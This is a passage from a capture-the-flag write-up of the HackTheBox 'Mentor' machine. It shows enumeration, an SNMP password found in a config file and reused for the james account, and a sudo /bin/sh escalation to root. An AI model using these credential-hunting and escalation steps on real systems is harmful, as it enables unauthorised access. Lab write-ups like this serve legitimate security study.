tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">172</span>.22.0.1:8000<span class="w">         </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">35174</span><span class="w">      </span>-
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::22<span class="w">                   </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">32754</span><span class="w">      </span>-
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::80<span class="w">                   </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">32804</span><span class="w">      </span>-
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">102</span><span class="w">        </span><span class="m">29978</span><span class="w">      </span>-
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:68<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">0</span><span class="w">          </span><span class="m">31132</span><span class="w">      </span>-
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:161<span class="w">             </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">0</span><span class="w">          </span><span class="m">33892</span><span class="w">      </span>-
udp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>::1:161<span class="w">                 </span>:::*<span class="w">                                </span><span class="m">0</span><span class="w">          </span><span class="m">33893</span><span class="w">      </span>-
svc@mentor:~$<span class="w"> </span>id
<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>svc<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>svc<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>svc<span class="o">)</span>
svc@mentor:~$<span class="w"> </span>ls<span class="w"> </span>-la
total<span class="w"> </span><span class="m">56</span>
drwxr-x---<span class="w"> </span><span class="m">6</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">11</span>:10<span class="w"> </span>.
drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>..
lrwxrwxrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">9</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">14</span>:28<span class="w"> </span>.bash_history<span class="w"> </span>-&gt;<span class="w"> </span>/dev/null
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">3771</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.bashrc
drwx------<span class="w"> </span><span class="m">3</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">12</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.cache
drwx------<span class="w"> </span><span class="m">3</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">11</span>:04<span class="w"> </span>.gnupg
-rw-------<span class="w"> </span><span class="m">1</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">    </span><span class="m">20</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">10</span>:51<span class="w"> </span>.lesshst
drwxrwxr-x<span class="w"> </span><span class="m">5</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">12</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.local
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">   </span><span class="m">807</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.profile
-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">    </span><span class="m">74</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">11</span>:10<span class="w"> </span>.selected_editor
drwx------<span class="w"> </span><span class="m">3</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">11</span>:04<span class="w"> </span>snap
-rw-r-----<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>svc<span class="w">    </span><span class="m">33</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">09</span>:43<span class="w"> </span>user.txt
-rw-------<span class="w"> </span><span class="m">1</span><span class="w"> </span>svc<span class="w">  </span>svc<span class="w">  </span><span class="m">9878</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">11</span>:03<span class="w"> </span>.viminfo
</pre></div>
</div>
<p>After running linpeas, we find out that we have write access to <code class="docutils literal notranslate"><span class="pre">/home/svc/.local/bin</span></code> which is in svc’s PATH, svc does not have any sudo access though, looking at pspy64 to see if we can catch something running as root like a cron of something from the api… API runs as root but from the container, so does the website on another container.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@mentor:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
svc@mentor:~$<span class="w"> </span>sudo<span class="w"> </span>-l
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>svc:
Sorry,<span class="w"> </span>user<span class="w"> </span>svc<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>run<span class="w"> </span>sudo<span class="w"> </span>on<span class="w"> </span>mentor.
</pre></div>
</div>
<p>ippsec goes on about doing some date matching forensics, by saying that the server’s ssh keys are generated at machine build time, so they give us a good idea of when the machine was generated.
Then we match files that were changed right after, so around when the box was configured.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>find<span class="w"> </span>/etc<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-newermt<span class="w"> </span><span class="m">2022</span>-06-04<span class="w"> </span>!<span class="w"> </span>-newermt<span class="w"> </span><span class="m">2022</span>-06-14<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">|</span>less<span class="w"> </span>-S
find<span class="w"> </span>/etc<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-newermt<span class="w"> </span><span class="m">2022</span>-06-04<span class="w"> </span>!<span class="w"> </span>-newermt<span class="w"> </span><span class="m">2022</span>-06-14<span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
<span class="w">   </span><span class="m">131800</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-r--r-----<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">         </span><span class="m">1695</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/sudoers
<span class="w">   </span><span class="m">133738</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">511</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/snmp/snmp.conf
<span class="w">   </span><span class="m">139507</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">         </span><span class="m">3453</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/snmp/snmpd.conf
<span class="w">   </span><span class="m">132870</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">           </span><span class="m">36</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/subuid
<span class="w">   </span><span class="m">131797</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">           </span><span class="m">17</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/subgid-
<span class="w">   </span><span class="m">133677</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">158</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/systemd/system/login.service
<span class="w">   </span><span class="m">133681</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">148</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/systemd/system/docker-startup.service
<span class="w">   </span><span class="m">133673</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">          </span><span class="m">285</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/systemd/system/snap-core20-1518.mount
<span class="w">   </span><span class="m">133721</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">         </span><span class="m">1078</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/ssl/certs/ssl-cert-snakeoil.pem
<span class="w">   </span><span class="m">133630</span><span class="w">     </span><span class="m">64</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">        </span><span class="m">63312</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/udev/rules.d/70-snap.snapd.rules
<span class="w">   </span><span class="m">132106</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">           </span><span class="m">36</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/subgid
<span class="w">   </span><span class="m">131753</span><span class="w">      </span><span class="m">4</span><span class="w"> </span>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>root<span class="w">     </span>root<span class="w">           </span><span class="m">17</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>/etc/subuid-
</pre></div>
</div>
<p>We find an snmp v3 password in the snmp config</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="o">^</span><span class="c1"># /etc/snmp/snmpd.conf|grep ^.</span>
<span class="n">sysLocation</span>    <span class="n">Sitting</span> <span class="n">on</span> <span class="n">the</span> <span class="n">Dock</span> <span class="n">of</span> <span class="n">the</span> <span class="n">Bay</span>
<span class="n">sysContact</span>     <span class="n">Me</span> <span class="o">&lt;</span><span class="n">admin</span><span class="nd">@mentorquotes</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
<span class="n">sysServices</span>    <span class="mi">72</span>
<span class="n">master</span>  <span class="n">agentx</span>
<span class="n">agentAddress</span> <span class="n">udp</span><span class="p">:</span><span class="mi">161</span><span class="p">,</span><span class="n">udp6</span><span class="p">:[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">161</span>
<span class="n">view</span>   <span class="n">systemonly</span>  <span class="n">included</span>   <span class="mf">.1.3.6.1.2.1.1</span>
<span class="n">view</span>   <span class="n">systemonly</span>  <span class="n">included</span>   <span class="mf">.1.3.6.1.2.1.25.1</span>
<span class="n">rocommunity</span>  <span class="n">public</span> <span class="n">default</span> <span class="o">-</span><span class="n">V</span> <span class="n">systemonly</span>
<span class="n">rocommunity6</span> <span class="n">public</span> <span class="n">default</span> <span class="o">-</span><span class="n">V</span> <span class="n">systemonly</span>
<span class="n">rouser</span> <span class="n">authPrivUser</span> <span class="n">authpriv</span> <span class="o">-</span><span class="n">V</span> <span class="n">systemonly</span>
<span class="n">includeDir</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">snmp</span><span class="o">/</span><span class="n">snmpd</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">d</span>
<span class="n">createUser</span> <span class="n">bootstrap</span> <span class="n">MD5</span> <span class="n">SuperSecurePassword123__</span> <span class="n">DES</span>
<span class="n">rouser</span> <span class="n">bootstrap</span> <span class="n">priv</span>
<span class="n">com2sec</span> <span class="n">AllUser</span> <span class="n">default</span> <span class="n">internal</span>
<span class="n">group</span> <span class="n">AllGroup</span> <span class="n">v2c</span> <span class="n">AllUser</span>
<span class="n">view</span> <span class="n">SystemView</span> <span class="n">included</span> <span class="mf">.1.3.6.1.2.1.25.1.1</span>
<span class="n">view</span> <span class="n">AllView</span> <span class="n">included</span> <span class="mf">.1</span>
<span class="n">access</span> <span class="n">AllGroup</span> <span class="s2">&quot;&quot;</span> <span class="nb">any</span> <span class="n">noauth</span> <span class="n">exact</span> <span class="n">AllView</span> <span class="n">none</span> <span class="n">none</span>
</pre></div>
</div>
<p>There is no bootstrap user in the system, but this might have been reused, and it was been by james:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>svc@mentor:~$<span class="w"> </span>grep<span class="w"> </span>sh$<span class="w"> </span>/etc/passwd
root:x:0:0:root:/root:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash
svc@mentor:~$<span class="w"> </span>su<span class="w"> </span>-<span class="w"> </span>james
Password:
james@mentor:~$<span class="w"> </span>id
<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>james<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>james<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>james<span class="o">)</span>
james@mentor:~$<span class="w"> </span><span class="nb">pwd</span>
/home/james
james@mentor:~$<span class="w"> </span>ls<span class="w"> </span>-la
total<span class="w"> </span><span class="m">20</span>
drwxr-x---<span class="w"> </span><span class="m">3</span><span class="w"> </span>james<span class="w"> </span>james<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">14</span>:27<span class="w"> </span>.
drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>root<span class="w">  </span>root<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>..
lrwxrwxrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w">  </span>root<span class="w">     </span><span class="m">9</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">14</span>:27<span class="w"> </span>.bash_history<span class="w"> </span>-&gt;<span class="w"> </span>/dev/null
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>james<span class="w"> </span>james<span class="w"> </span><span class="m">3771</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.bashrc
drwx------<span class="w"> </span><span class="m">2</span><span class="w"> </span>james<span class="w"> </span>james<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.cache
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>james<span class="w"> </span>james<span class="w">  </span><span class="m">807</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.profile
</pre></div>
</div>
<p>James also does not have docker access but may sudo to /bin/sh as root</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>james@mentor:~$<span class="w"> </span>sudo<span class="w"> </span>-l
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>james:
Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>james<span class="w"> </span>on<span class="w"> </span>mentor:
<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,<span class="w"> </span>use_pty

User<span class="w"> </span>james<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>mentor:
<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>/bin/sh
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>james@mentor:~$<span class="w"> </span>sudo<span class="w"> </span>/bin/sh
<span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
<span class="c1"># pwd</span>
/home/james
<span class="c1"># cd</span>
<span class="c1"># pwd</span>
/root
<span class="c1"># ls -la</span>
total<span class="w"> </span><span class="m">44</span>
drwx------<span class="w">  </span><span class="m">7</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">10</span>:25<span class="w"> </span>.
drwxr-xr-x<span class="w"> </span><span class="m">19</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">16</span>:00<span class="w"> </span>..
lrwxrwxrwx<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">9</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">14</span>:28<span class="w"> </span>.bash_history<span class="w"> </span>-&gt;<span class="w"> </span>/dev/null
-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">3106</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">15</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span>.bashrc
drwx------<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.cache
drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.local
-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">0</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>logins.log
-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">161</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">9</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.profile
-rw-r-----<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">33</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">11</span>:27<span class="w"> </span>root.txt
drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">12</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>scripts
drwx------<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">3</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>snap
drwx------<span class="w">  </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">12</span>:13<span class="w"> </span>.ssh
-rw-------<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">2433</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">10</span>:25<span class="w"> </span>.viminfo
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># docker ps</span>
CONTAINER<span class="w"> </span>ID<span class="w">   </span>IMAGE<span class="w">         </span>COMMAND<span class="w">                  </span>CREATED<span class="w">          </span>STATUS<span class="w">          </span>PORTS<span class="w">                       </span>NAMES
3bce68c242fa<span class="w">   </span>docker_web<span class="w">    </span><span class="s2">&quot;python main.py&quot;</span><span class="w">         </span><span class="m">43</span><span class="w"> </span>minutes<span class="w"> </span>ago<span class="w">   </span>Up<span class="w"> </span><span class="m">43</span><span class="w"> </span>minutes<span class="w">   </span><span class="m">172</span>.22.0.1:81-&gt;80/tcp<span class="w">       </span>docker_web_1
c26466ec1466<span class="w">   </span>docker_api<span class="w">    </span><span class="s2">&quot;python3 -m uvicorn …&quot;</span><span class="w">   </span><span class="m">43</span><span class="w"> </span>minutes<span class="w"> </span>ago<span class="w">   </span>Up<span class="w"> </span><span class="m">43</span><span class="w"> </span>minutes<span class="w">   </span><span class="m">172</span>.22.0.1:8000-&gt;8000/tcp<span class="w">   </span>docker_api_1
96e44c569292<span class="w">   </span>postgres:13<span class="w">   </span><span class="s2">&quot;docker-entrypoint.s…&quot;</span><span class="w">   </span><span class="m">9</span><span class="w"> </span>months<span class="w"> </span>ago<span class="w">     </span>Up<span class="w"> </span><span class="m">43</span><span class="w"> </span>minutes<span class="w">   </span><span class="m">172</span>.22.0.1:5432-&gt;5432/tcp<span class="w">   </span>docker_postgres_1
</pre></div>
</div>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../only4you/only4you.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Only4you</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../manager/manager.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Manager</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Mentor</a><ul>
<li><a class="reference internal" href="#enum">Enum</a></li>
<li><a class="reference internal" href="#api">API</a></li>
<li><a class="reference internal" href="#snmp-enum">SNMP Enum</a></li>
<li><a class="reference internal" href="#command-injection-in-the-api">Command injection in the API</a></li>
<li><a class="reference internal" href="#the-tcpdump-tangent">The TCPDump tangent</a></li>
<li><a class="reference internal" href="#foothold">Foothold</a></li>
<li><a class="reference internal" href="#pivoting-and-further-enumeration">Pivoting and further enumeration</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
    <script src="../../../../_static/doctools.js?v=888ff710"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
    </body>
</html>